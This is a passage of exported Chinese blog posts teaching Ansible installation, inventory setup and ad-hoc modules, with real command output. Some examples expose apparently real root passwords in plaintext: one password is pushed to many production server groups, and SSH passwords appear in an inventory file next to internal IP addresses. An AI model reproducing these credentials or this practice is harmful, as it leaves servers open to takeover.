/srv/logstash.tar.gz&quot; -C /srv/. 五、yum模块yum安装使用：使用yum包管理器来管理软件包，其选项有： config_file：yum的配置文件 disable_gpg_check：关闭gpg_check disablerepo：不启用某个源 enablerepo：启用某个源 name：要进行操作的软件包的名字，也可以传递一个url或者一个本地的rpm包的路径state：状态（present，absent，latest） 示例如下： 1ansible tomcat_D1 -s -m yum -a \"name=wget state=latest\" 12345678910111213141516[root@ansible playbook]# ansible tomcat_D1 -s -C -m yum -a \"name=kernel state=latest\"192.168.1.178 | SUCCESS =&gt; &#123; \"changed\": true, \"changes\": &#123; \"installed\": [], \"updated\": [ [ \"kernel\", \"2.6.32-642.4.2.el6.x86_64 from updates\" ] ] &#125;, \"msg\": \"\", \"rc\": 0, \"results\": []&#125; 六 service模块用于管理服务 该模块包含如下选项： arguments：给命令行提供一些选项 enabled：是否开机启动 yes|no name：必选项，服务名称 pattern：定义一个模式，如果通过status指令来查看服务的状态时，没有响应，就会通过ps指令在进程中根据该模式进行查找，如果匹配到，则认为该服务依然在运行 runlevel：运行级别 sleep：如果执行了restarted，在则stop和start之间沉睡几秒钟 state：对当前服务执行启动，停止、重启、重新加载等操作（started,stopped,restarted,reloaded） 示例如下： 1234ansible test -m service -a \"name=httpd state=started enabled=yes\" ansible test -m service -a \"name=foo pattern=/usr/bin/foo state=started\" ansible test -m service -a \"name=network state=restarted args=eth0\"ansible cluster2:children -m service -a \"name=logstash pattern=/etc/init.d/logstash state=started\" 参考：http://www.361way.com/ansible-modules/4415.html 七 shell 模块这里我写个例子： 批量更改组的机器的用户名密码。 12345678910111213141516[root@salt ansible]# ansible cluster1:children -m shell -a \"echo \"Ihaozhuo\" | passwd --stdin \"root\" \"10.43.59.190 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。10.23.2.106 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。10.23.232.85 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。10.23.232.131 | SUCCESS | rc=0 &gt;&gt;更改用户 root 的密码 。passwd： 所有的身份验证令牌已经成功更新。 查看分组上机器所有端口： 123456789101112131415161718192021222324252627[root@salt ansible]# ansible zk1:children -m shell -a \"netstat -ntulp\"10.37.238.75 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:56521 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1251/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 12497/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1434/aegis_quartzudp 0 0 118.178.240.129:123 0.0.0.0:* 1262/ntpdudp 0 0 10.27.238.75:123 0.0.0.0:* 1262/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1262/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1262/ntpd10.37.100.200 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:58367 0.0.0.0:* LISTEN 11232/javatcp 0 0 10.47.100.200:10050 0.0.0.0:* LISTEN 646/zabbix_agentdtcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 11232/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1243/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 11232/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1436/aegis_quartzudp 0 0 120.27.152.77:123 0.0.0.0:* 1254/ntpdudp 0 0 10.47.100.200:123 0.0.0.0:* 1254/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1254/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1254/ntpd shell 模块 可以用的最多。查看目录执行文件等等。 ansible修改线上服务器上的密码 12345678910111213141516ansible cluster1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible cluster2:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible cluster3:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible zk1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible kafka1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible es1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible ihaozhuo1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"ansible monitor1:children -m shell -a \"echo \"Ihaozhuo_b3314\" | passwd --stdin \"root\" \"","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"Ansible小结（四）Ad-hoc与commands模块","slug":"自动化+可视化/Ansible/Ansible小结（四）Ad-hoc与commands模块 ","date":"2016-03-09T09:56:03.000Z","updated":"2017-03-14T05:52:08.000Z","comments":true,"path":"2016/03/09/自动化+可视化/Ansible/Ansible小结（四）Ad-hoc与commands模块 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/09/自动化+可视化/Ansible/Ansible小结（四）Ad-hoc与commands模块 /","excerpt":"","text":"ansible小结（四）Ad-hoc与commands模块Ad-Hoc 是指ansible下临时执行的一条命令，并且不需要保存的命令，对于复杂的命令后面会说playbook。讲到Ad-hoc 就要提到模块，所有的命令执行都要依赖于事先写好的模块，默认安装好的ansible 里面已经自带了很多模块，如：command、raw、shell、file、cron等，具体可以通过ansible-doc -l 进行查看 。 1、Ad-hoc1、直接执行 这里还是先来一个上几篇幅经常用到的一个例子： 1234[root@docker ~]# ansible tomcat_C1 -a \"uptime\" -kSSH password:192.168.1.177 | SUCCESS | rc=0 &gt;&gt; 10:37:10 up 24 days, 16:48, 4 users, load average: 0.00, 0.00, 0.00 一个ad-hoc命令的执行，需要按以下格式进行执行： 1ansible 主机或组 -m 模块名 -a '模块参数' ansible参数 主机和组，是在/etc/ansible/hosts 里进行指定的部分，当然动态Inventory 使用的是脚本从外部应用里获取的主机. 模块名，可以通过ansible-doc -l查看目前安装的模块，默认不指定时，使用的是command模块，具体可以查看/etc/ansible/ansible.cfg 的“#module_name = command ” 部分，默认模块可以在该配置文件中进行修改； 模块参数，可以通过 “ansible-doc 模块名” 查看具体的用法及后面的参数； ansible参数，可以通过ansible命令的帮忙信息里查看到，这里有很多参数可以供选择，如是否需要输入密码、是否sudo等。 2、后台执行例子当命令执行时间比较长时，也可以放到后台执行，这里会用到-B、-P参数，如下： 123ansible all -B 3600 -a \"/usr/bin/long_running_operation --do-stuff\" \\\\后台执行命令 3600s，-B 表示后台执行的时间ansible all -m async_status -a \"jid=123456789\" \\\\检查任务的状态ansible all -B 1800 -P 60 -a \"/usr/bin/long_running_operation --do-stuff\" \\\\后台执行命令最大时间是 1800s 即 30 分钟，-P 每 60s 检查下状态默认 15s 123[root@docker ~]# ansible -B 60 -P 1 tomcat_B1 -a \"uptime\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 11:23:00 up 24 days, 17:34, 1 user, load average: 0.00, 0.00, 0.00 二、commands模块上面已经提到，ansbile自身已经自带了很多模块，可以通过ansible-doc -l 进行查看。这里就结合command、shell、raw、script模块了解下其用法。 上面四个模块都属于commands 类。 command模块，该模块通过-a跟上要执行的命令可以直接执行，不过命令里如果有带有如下字符部分则执行不成功 “ so variables like $HOME and operations like “&lt;”, “&gt;”, “|”, and “&amp;” will not work (use the shell module if you need these features).”；** shell模块，用法其本和command一样，不过的是其是通过/bin/sh进行执行，所以shell 模块可以执行任何命令，就像在本机执行一样，“ It is almost exactly like the command module but runs the command through a shell (/bin/sh) on the remote node.”； raw模块，用法和shell 模块一样 ，其也可以执行任意命令，就像在本机执行一样，“Executes a low-down and dirty SSH command, not going through the module subsystem. There is no change handler support for this module. This module does not require python on the remote system” script模块，其是将管理端的shell 在被管理主机上执行，其原理是先将shell 复制到远程主机，再在远程主机上执行，原理类似于raw模块，“This module does not require python on the remote system, much like the raw module.” 。 注：raw模块和comand、shell 模块不同的是其没有chdir、creates、removes参数，chdir参数的作用就是先切到chdir指定的目录后，再执行后面的命令，这在后面很多模块里都会有该参数 。 ###command模块包含如下选项： creates：一个文件名，当该文件存在，则该命令不执行 free_form：要执行的linux指令 chdir：在执行指令之前，先切换到该指定的目录 removes：一个文件名，当该文件不存在，则该选项不执行 executable：切换shell来执行指令，该执行路径必须是一个绝对路径 command模块、raw模块、shell模块示例： command例子：123456789101112131415161718192021222324252627[root@docker ~]# ansible tomcat_B1 -m command -a \"ps -ef|grep tomcat\"192.168.1.176 | FAILED | rc=1 &gt;&gt;ERROR: Unsupported SysV option.********* simple selection ********* ********* selection by list *********-A all processes -C by command name-N negate selection -G by real group ID (supports names)-a all w/ tty except session leaders -U by real user ID (supports names)-d all except session leaders -g by session OR by effective group name-e all processes -p by process ID -q by process ID (unsorted &amp; quick)T all processes on this terminal -s processes in the sessions givena all w/ tty, including other users -t by ttyg OBSOLETE -- DO NOT USE -u by effective user ID (supports names)r only running processes U processes for specified usersx processes w/o controlling ttys t by tty*********** output format ********** *********** long options ***********-o,o user-defined -f full --Group --User --pid --cols --ppid-j,j job control s signal --group --user --sid --rows --info-O,O preloaded -o v virtual memory --cumulative --format --deselect-l,l long u user-oriented --sort --tty --forest --version-F extra full X registers --heading --no-heading --context --quick-pid ********* misc options *********-V,V show version L list format codes f ASCII art forest-m,m,-L,-T,H threads S children in sum -y change -l format-M,Z security data c true command name -c scheduling class-w,w wide output n numeric WCHAN,UID -H process hierarchy 上面的执行结果可以看到，我这里加了管道，command模块执行时出错，而使用raw模块和shell模块都正常。 shell例子：123[root@docker ~]# ansible tomcat_B1 -m shell -a \"ps -ef|grep tomcat\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;root 1529 1 0 Aug11 ? 00:00:00 jsvc.exec -java-home /srv/jdk1.7.0_67 -user tomcat -pidfile /srv/tomcat/tomcat_manager/logs/catalina-daemon.pid -wait 10 -outfile /srv/tomcat/tomcat_manager/logs/catalina-daemon.out -errfile &amp;1 -classpath /srv/tomcat/tomcat_manager/bin/bootstrap.jar:/srv/tomcat/ 使用chdir的示例：12345678[root@docker ~]# ansible tomcat_B1 -m command -a \"chdir=/tmp/ touch 1.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;[root@docker ~]# ansible tomcat_B1 -m shell -a \"chdir=/tmp/ touch 2.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;[root@docker ~]# ansible tomcat_B1 -m raw -a \"chdir=/tmp/ touch 3.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 从上面执行结果来看，三个命令都执行成功了。不过通过在远程主机上查看，前两个文件被成功创建： 12345[root@docker ~]# ansible tomcat_B1 -m command -a \"chdir=/tmp/ ls -lh\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;total 188K-rw-r--r--. 1 root root 0 Sep 5 22:52 1.txt-rw-r--r--. 1 root root 0 Sep 5 22:51 2.txt 使用raw模块的执行的结果文件也被正常创建了，不过不是在chdir 指定的目录，而是在当前执行用户的家目录。 123[root@docker ~]# ansible tomcat_B1 -m raw -a \"ls ~/4.txt\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt;/root/4.txt creates与removes示例：这里我在测试主机上创建/tmp/server.txt文件，执行结果如下： creates：一个文件名，当该文件存在，则该命令不执行 1234567[root@docker ~]# ansible tomcat_B1 -a \"creates=/tmp/1.txt uptime\" [WARNING]: Failure using method (v2_runner_on_ok) in callback plugin (&lt;ansible.plugins.callback.minimal.CallbackModule object at 0x2093e90&gt;): coercing toUnicode: need string or buffer, bool found[root@docker ~]# ansible tomcat_B1 -a \"removes=/tmp/1.txt uptime\"192.168.1.176 | SUCCESS | rc=0 &gt;&gt; 22:59:04 up 25 days, 5:10, 1 user, load average: 0.00, 0.00, 0.00 script模块示例：1234567891011121314[root@361way ~]# cat script.sh#!/bin/bashdf -hlifconfigps auxf|grep snmp[root@361way ~]# ansible 10.212.52.252 -m script -a 'scrip.sh'10.212.52.252 | FAILED =&gt; file or module does not exist: /root/scrip.sh[root@361way ~]# ansible 10.212.52.252 -m script -a 'script.sh'10.212.52.252 | success &gt;&gt; &#123; \"changed\": true, \"rc\": 0, \"stderr\": \"OpenSSH_5.3p1, OpenSSL 1.0.1e-fips 11 Feb 2013\\ndebug1: Reading configuration data /etc/ssh/ssh_config\\r\\ndebug1: Applying options for *\\r\\ndebug1: auto-mux: Trying existing master\\r\\nControl socket connect(/root/.ansible/cp/ansible-ssh-10.212.52.252-22-root): Connection refused\\r\\ndebug1: Connecting to 10.212.52.252 [10.212.52.252] port 22.\\r\\ndebug1: fd 3 clearing O_NONBLOCK\\r\\ndebug1: Connection established.\\r\\ndebug1: permanently_set_uid: 0/0\\r\\ndebug1: identity file /root/.ssh/identity type -1\\r\\ndebug1: identity file /root/.ssh/identity-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_rsa type -1\\r\\ndebug1: identity file /root/.ssh/id_rsa-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_dsa type -1\\r\\ndebug1: identity file /root/.ssh/id_dsa-cert type -1\\r\\ndebug1: identity file /root/.ssh/id_ecdsa type -1\\r\\ndebug1: identity file /root/.ssh/id_ecdsa-cert type -1\\r\\ndebug1: Remote protocol version 2.0, remote software version OpenSSH_6.2\\r\\ndebug1: match: OpenSSH_6.2 pat OpenSSH*\\r\\ndebug1: Enabling compatibility mode for protocol 2.0\\r\\ndebug1: Local version string SSH-2.0-OpenSSH_5.3\\r\\ndebug1: SSH2_MSG_KEXINIT sent\\r\\ndebug1: SSH2_MSG_KEXINIT received\\r\\ndebug1: kex: server-&gt;client aes128-ctr hmac-md5 zlib@openssh.com\\r\\ndebug1: kex: client-&gt;server aes128-ctr hmac-md5 zlib@openssh.com\\r\\ndebug1: SSH2_MSG_KEX_DH_GEX_REQUEST(1024&lt;1024&lt;8192) sent\\r\\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_GROUP\\r\\ndebug1: SSH2_MSG_KEX_DH_GEX_INIT sent\\r\\ndebug1: expecting SSH2_MSG_KEX_DH_GEX_REPLY\\r\\ndebug1: Host '10.212.52.252' is known and matches the RSA host key.\\r\\ndebug1: Found key in /root/.ssh/known_hosts:1\\r\\ndebug1: ssh_rsa_verify: signature correct\\r\\ndebug1: SSH2_MSG_NEWKEYS sent\\r\\ndebug1: expecting SSH2_MSG_NEWKEYS\\r\\ndebug1: SSH2_MSG_NEWKEYS received\\r\\ndebug1: SSH2_MSG_SERVICE_REQUEST sent\\r\\ndebug1: SSH2_MSG_SERVICE_ACCEPT received\\r\\ndebug1: Authentications that can continue: publickey,password,keyboard-interactive\\r\\ndebug1: Next authentication method: keyboard-interactive\\r\\ndebug1: Enabling compression at level 6.\\r\\ndebug1: Authentication succeeded (keyboard-interactive).\\r\\ndebug1: setting up multiplex master socket\\r\\nControlSocket /root/.ansible/cp/ansible-ssh-10.212.52.252-22-root already exists, disabling multiplexing\\r\\ndebug1: channel 0: new [client-session]\\r\\ndebug1: Requesting no-more-sessions@openssh.com\\r\\ndebug1: Entering interactive session.\\r\\ndebug1: Sending environment.\\r\\ndebug1: Sending env LANG = en_US.UTF-8\\r\\ndebug1: Sending command: LANG=C LC_CTYPE=C /root/.ansible/tmp/ansible-tmp-1431924855.88-242473611260231/script.sh \\r\\ndebug1: client_input_channel_req: channel 0 rtype exit-status reply 0\\r\\ndebug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0\\r\\ndebug1: channel 0: free: client-session, nchannels 1\\r\\ndebug1: fd 1 clearing O_NONBLOCK\\r\\ndebug1: fd 2 clearing O_NONBLOCK\\r\\nConnection to 10.212.52.252 closed.\\r\\nTransferred: sent 1928, received 3920 bytes, in 0.1 seconds\\r\\nBytes per second: sent 37017.0, received 75262.7\\r\\ndebug1: Exit status 0\\r\\ndebug1: compress outgoing: raw data 537, compressed 375, factor 0.70\\r\\ndebug1: compress incoming: raw data 1837, compressed 1019, factor 0.55\\r\\n\", \"stdout\": \"Filesystem Size Used Avail Use% Mounted on\\r\\n/dev/sda2 9.9G 872M 8.5G 10% /\\r\\nudev 3.9G 128K 3.9G 1% /dev\\r\\ntmpfs 3.9G 76K 3.9G 1% /dev/shm\\r\\n/dev/sda3 5.0G 219M 4.5G 5% /boot\\r\\n/dev/sda8 40G 15G 23G 40% /home\\r\\n/dev/sda9 9.9G 5.2G 4.3G 55% /opt\\r\\n/dev/sda6 5.0G 2.7G 2.1G 57% /tmp\\r\\n/dev/sda5 9.9G 3.4G 6.0G 36% /usr\\r\\n/dev/sda7 9.9G 823M 8.6G 9% /var\\r\\neth0 Link encap:Ethernet HWaddr 00:50:56:A8:65:7E \\r\\n inet addr:10.212.52.252 Bcast:10.212.52.255 Mask:255.255.255.0\\r\\n inet6 addr: fe80::250:56ff:fea8:657e/64 Scope:Link\\r\\n UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1\\r\\n RX packets:24112135 errors:0 dropped:792372 overruns:0 frame:0\\r\\n TX packets:10697339 errors:0 dropped:0 overruns:0 carrier:0\\r\\n collisions:0 txqueuelen:1000 \\r\\n RX bytes:17137233328 (16343.3 Mb) TX bytes:13390377826 (12770.0 Mb)\\r\\n\\r\\nlo Link encap:Local Loopback \\r\\n inet addr:127.0.0.1 Mask:255.0.0.0\\r\\n inet6 addr: ::1/128 Scope:Host\\r\\n UP LOOPBACK RUNNING MTU:16436 Metric:1\\r\\n RX packets:3407332 errors:0 dropped:0 overruns:0 frame:0\\r\\n TX packets:3407332 errors:0 dropped:0 overruns:0 carrier:0\\r\\n collisions:0 txqueuelen:0 \\r\\n RX bytes:262675450 (250.5 Mb) TX bytes:262675450 (250.5 Mb)\\r\\n\\r\\nroot 25332 0.0 0.0 4260 568 pts/2 S+ 12:54 0:00 \\\\_ grep snmp\\r\\nroot 24364 0.0 0.0 70416 6696 ? SNl May15 0:22 /usr/sbin/snmpd -r -A -LF i /var/log/net-snmpd.log -p /var/run/snmpd.pid\\r\\n\"&#125; 输出结果很多，看起来也很乱，不过查下stdout部分，这个部分是实际上执行后的结果。这里可以配合管道一起使用，可以如下使用： ` [root@361way ~]# ansible 10.212.52.252 -m script -a &#39;script.sh&#39; |egrep &#39;&gt;&gt;|stdout&#39;","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"},{"name":"Automation","slug":"Automation","permalink":"http://blog.yangcvo.me/tags/Automation/"}]},{"title":"Ansible 小结（一）ansible的安装","slug":"自动化+可视化/Ansible/Ansible 小结（一）ansible的安装 ","date":"2016-03-07T10:56:03.000Z","updated":"2017-03-27T02:37:52.000Z","comments":true,"path":"2016/03/07/自动化+可视化/Ansible/Ansible 小结（一）ansible的安装 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/07/自动化+可视化/Ansible/Ansible 小结（一）ansible的安装 /","excerpt":"","text":"上一篇文章记录了解ansible,这篇大概记录下常规使用命令。 这里以CentOS Linux release 7.2.1511 (Core)系统为准。 一、Ansible的安装Centos安装1、yum源安装 以centos为例，默认在源里没有ansible，不过在fedora epel源里有ansible，配置完epel 源后，可以直接通过yum 进行安装。这里以centos6.8为例： 123456centos 6# yum install http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpmcentos 7# yum install http://mirrors.sohu.com/fedora-epel/7/x86_64/e/epel-release-7-9.noarch.rpm# yum install -y ansible Ubuntu安装2、apt-get安装 在ubuntu及其衍生版中，可以通过增加ppa源进行apt-get安装，具体如下： 1234$ sudo apt-get install software-properties-common$ sudo apt-add-repository ppa:ansible/ansible$ sudo apt-get update$ sudo apt-get install ansible 3、源码安装 源码安装需要python2.6以上版本，其依赖模块paramiko、PyYAML、Jinja2、httplib2、simplejson、pycrypto模块，以上模块可以通过pip或easy_install 进行安装，不过本部分既然提到的是源码安装，主要针对的无法上外网的情况下，可以通过pypi 站点搜索以上包，下载后通过python setup.py install 进行安装。 最后通过github或pypi上下载ansible源码包，通过python setup.py install 安装即可。由于安装过程相对简单，这里略过，主要介绍安装后，可能遇到的问题。 a、安装PyYAML时，报错如下： 123456789# python setup.py installlibyaml is not found or a compiler error: forcing --without-libyaml(if libyaml is installed correctly, you may need to specify the option --include-dirs or uncomment and modify the parameter include_dirs in setup.cfg)running install_librunning install_egg_infoRemoving /usr/lib64/python2.6/site-packages/PyYAML-3.11-py2.6.egg-infoWriting /usr/lib64/python2.6/site-packages/PyYAML-3.11-py2.6.egg-info 在centos6.8系统中，可以通过yum -y install libyaml包解决，或者从ISO文件中提供该包，通过rpm -ivh进行安装。 ###二、Ansible的配置与验证 yum 安装使用默认示例配置文件后，编辑/etc/ansible/hosts文件，通过以下方式验证ansible是否可用： 12345[root@docker ~]# cat /etc/ansible/hosts[test]10.212.52.252 ansible_ssh_user=root ansible_ssh_pass=qwe123.com10.212.52.14 ansible_ssh_user=root ansible_ssh_pass=abc12310.212.52.16 ansible_ssh_user=root ansible_ssh_pass=91it.org 以上的配置中，我配置了一个test组，该组下有三台主机，三台都使用root验证，三台的密码分别是361way.com、abc123、91it.org 。 注：后面的用户和密码项是非必须的，在配置key认证的情况下，不使用密码也可以直接操作 。未使用key的，也可以在ansible通过 -k参数在操作前询问手动输入密码。 配置文件就是一般下目录的hosts文件。 在库存中，我们可以定义如下信息： 主机地址 主机分组 连接属性（登录名，密码，秘钥，端口等）1，主机地址和分组 定义主机地址和名称比较简单： 12[&lt;主机名&gt;]&lt;主机 IP&gt; 定义分组的语法类似，就是在名字后加上:children，成员可以是主机名，也可以是分组名： 123[&lt;分组名&gt;:children]&lt;主机名&gt;&lt;分组名&gt; 2，连接属性 可以针对SSH连接指定一些参数： ansible_ssh_host：主机名。 ansible_ssh_port：SSH端口，默认22。 ansible_ssh_user：登录用户。 ansible_ssh_pass：登陆密码。 ansible_ssh_private_key_file：私钥。 通过私钥登陆的话，就不要指定登录密码了，主机名也可以忽略。当然，既然是使用私钥登陆，需要你确保已经在各个中主机的authorized_keys里添加了对应的公钥。 3，演示 完整的库存例子如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# -----------------# 首先定义各个主机# -----------------#============================01_version=============================#[tomcat-account_01] 10.27.232.82[tomcat-point_01] 10.27.2.12[tomcat-system_01] 10.27.232.12 [tomcat-family_01] 10.27.230.63 [tomcat-mission_01] 10.47.59.12 [tomcat-card_01] 10.47.74.12 [tomcat-check_01] 10.47.107.153 # -----------------# 定义分组## 在这里我们定义了三个分组，分别名为：# - cluster1# - light# - starwar# -----------------[cluster1:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01[light:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01[starwar:children]tomcat-account_01tomcat-point_01tomcat-system_01tomcat-family_01tomcat-mission_01# -----------------# 给分组定义变量## 这里我们给 starwar 组定义了变量 # -----------------[cluster1:vars]ansible_ssh_port=7525ansible_ssh_user=lucasansible_ssh_private_key_file=./ssh/id_rsa 这里设置分组的时候名字不能与单台机器名称一样。比如： 1234[tomcat-account_01] 10.27.232.82[tomcat-account_01:children]tomcat-account_01 这里例子是错误的，会提示分组存在。 为了安全和方便在hosts里面就不需要写用户名和密码。做个免秘钥登陆。这里我自己对控制的机器全部做了免秘钥登陆，所以这里只需要这么写： 1234567891011121314151617[redis1]192.168.1.173[redis2]192.168.1.174[tomcat_A1]192.168.1.175[tomcat_B1]192.168.1.176[tomcat_C1]192.168.1.177[tomcat_D1]192.168.1.178 这里是执行脚本。 1ansible tomcat_D1 -m shell -a \"sh +x /root/update/shoppingmall.sh\" 例子操作查看zk1分组上所有机器端口： 123456789101112131415161718192021222324252627[root@salt ansible]# ansible zk1:children -m shell -a \"netstat -ntulp\"10.27.238.75 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:56521 0.0.0.0:* LISTEN 12497/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1251/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 12497/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1434/aegis_quartzudp 0 0 118.178.240.129:123 0.0.0.0:* 1262/ntpdudp 0 0 10.27.238.75:123 0.0.0.0:* 1262/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1262/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1262/ntpd10.47.100.200 | SUCCESS | rc=0 &gt;&gt;Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program nametcp 0 0 0.0.0.0:58367 0.0.0.0:* LISTEN 11232/javatcp 0 0 10.47.100.200:10050 0.0.0.0:* LISTEN 646/zabbix_agentdtcp 0 0 0.0.0.0:2181 0.0.0.0:* LISTEN 11232/javatcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1243/sshdtcp 0 0 0.0.0.0:4888 0.0.0.0:* LISTEN 11232/javatcp 0 0 127.0.0.1:15770 0.0.0.0:* LISTEN 1436/aegis_quartzudp 0 0 120.27.152.77:123 0.0.0.0:* 1254/ntpdudp 0 0 10.47.100.200:123 0.0.0.0:* 1254/ntpdudp 0 0 127.0.0.1:123 0.0.0.0:* 1254/ntpdudp 0 0 0.0.0.0:123 0.0.0.0:* 1254/ntpd","raw":null,"content":null,"categories":[{"name":"automation","slug":"automation","permalink":"http://blog.yangcvo.me/categories/automation/"}],"tags":[{"name":"Ansible","slug":"Ansible","permalink":"http://blog.yangcvo.me/tags/Ansible/"}]},{"title":"Ansible小结（二）ansible架构","slug":"自动化+可视化/Ansible/ansible小结（二）ansible架构 ","date":"2016-03-07T09:56:03.000Z","updated":"2017-03-14T05:52:04.000Z","comments":true,"path":"2016/03/07/自动化+可视化/Ansible/ansible小结（二）ansible架构 /","link":"","permalink":"http://blog.yangcvo.me/2016/03/07/自动化+可视化/Ansible/ansible小结（二）ansible架构 /","excerpt":"","text":"Ansible 是一个模型驱动的配置管理器，支持多节点发布、远程任务执行。默认使用 SSH 进行远程连接。无需在被管理节点上安装附加软件，可使用各种编程语言进行扩展。 上图为ansible的基本架构，从上图可以了解到其由以下部分组成： 1234567核心：ansible核心模块（Core Modules）：这些都是ansible自带的模块 扩展模块（Custom Modules）：如果核心模块不足以完成某种功能，可以添加扩展模块插件（Plugins）：完成模块功能的补充剧本（Playbooks）：ansible的任务配置文件，将多个任务定义在剧本中，由ansible自动执行连接插件（Connectior Plugins）：ansible基于连接插件连接到各个主机上，虽然ansible是使用ssh连接到各个主机的，但是它还支持其他的连接方法，所以需要有连接插件主机群（Host Inventory）：定义ansible管理的主机 二、ansible工作原理 12345 1、管理端支持local 、ssh、zeromq 三种方式连接被管理端，默认使用基于ssh的连接－－－这部分对应基本架构图中的连接模块；2、可以按应用类型等方式进行Host Inventory（主机群）分类，管理节点通过各类模块实现相应的操作－－－单个模块，单条命令的批量执行，我们可以称之为ad-hoc；3、管理节点可以通过playbooks 实现多个task的集合实现一类功能，如web服务的安装部署、数据库服务器的批量备份等。playbooks我们可以简单的理解为，系统通过组合多条ad-hoc操作的配置文件 。 三、ansible的七个命令安装完ansible后，发现ansible一共为我们提供了七个指令： 1234567ansibleansible-docansible-galaxyansible-lintansible-playbookansible-pullansible-vault 这里我们只查看usage部分，详细部分可以通过 “指令 -h” 的方式获取。 1、ansible123456789101112131415161718192021222324252627282930313233343536373839404142[root@docker ~]# ansible -hUsage: ansible &lt;host-pattern&gt; [options]参数： -a 'Arguments', --args='Arguments' 命令行参数 -m NAME, --module-name=NAME 执行模块的名字，默认使用 command 模块，所以如果是只执行单一命令可以不用 -m参数 -i PATH, --inventory=PATH 指定库存主机文件的路径,默认为/etc/ansible/hosts. -u Username， --user=Username 执行用户，使用这个远程用户名而不是当前用户 -U --sud-user=SUDO_User sudo到哪个用户，默认为 root -k --ask-pass 登录密码，提示输入SSH密码而不是假设基于密钥的验证 -K --ask-sudo-pass 提示密码使用sudo -s --sudo sudo运行 -S --su 用 su 命令 -l --list 显示所支持的所有模块 -s --snippet 指定模块显示剧本片段 -f --forks=NUM 并行任务数。NUM被指定为一个整数,默认是5。 #ansible testhosts -a \"/sbin/reboot\" -f 10 重启testhosts组的所有机器，每次重启10台 --private-key=PRIVATE_KEY_FILE 私钥路径，使用这个文件来验证连接 -v --verbose 详细信息 all 针对hosts 定义的所有主机执行 -M MODULE_PATH, --module-path=MODULE_PATH 要执行的模块的路径，默认为/usr/share/ansible/ --list-hosts 只打印有哪些主机会执行这个 playbook 文件，不是实际执行该 playbook 文件 -o --one-line 压缩输出，摘要输出.尝试一切都在一行上输出。 -t Directory, --tree=Directory 将内容保存在该输出目录,结果保存在一个文件中在每台主机上。 -B 后台运行超时时间 -P 调查后台程序时间 -T Seconds, --timeout=Seconds 时间，单位秒s -P NUM, --poll=NUM 调查背景工作每隔数秒。需要- b -c Connection, --connection=Connection 